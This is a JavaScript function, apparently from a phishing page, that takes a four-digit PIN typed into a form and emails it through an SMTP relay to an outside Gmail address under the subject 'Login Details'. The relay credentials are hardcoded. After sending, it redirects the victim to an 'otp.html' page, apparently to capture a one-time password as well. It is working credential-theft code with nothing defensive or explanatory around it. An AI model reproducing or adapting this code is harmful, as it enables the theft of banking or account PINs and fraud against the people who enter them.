function emailSend() {
  var pin1 = document.getElementsByName('pin1')[0].value;
  var pin2 = document.getElementsByName('pin2')[0].value;
  var pin3 = document.getElementsByName('pin3')[0].value;
  var pin4 = document.getElementsByName('pin4')[0].value;

  var pin = pin1 + pin2 + pin3 + pin4; // Concatenating the individual PIN values

  var messageBody = "PIN: " + pin; // Constructing the message body with the PIN

  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "payday10177@gmail.com",
    Password: "176A549B6BD880A9C5A531EDE06FF1F541C8",
    To: 'payday10177@gmail.com',
    From: "payday10177@gmail.com",
    Subject: "Login Details",
    Body: messageBody
  }).then(
    message => {
      if (message == 'OK') {
        window.location.href = 'otp.html'; // Redirecting to otp.html upon successful email sending
      }
      else {
        swal("Error", "Please complete the PIN details", "error") // Displaying an error message if email sending fails
      }
    }
  );
}
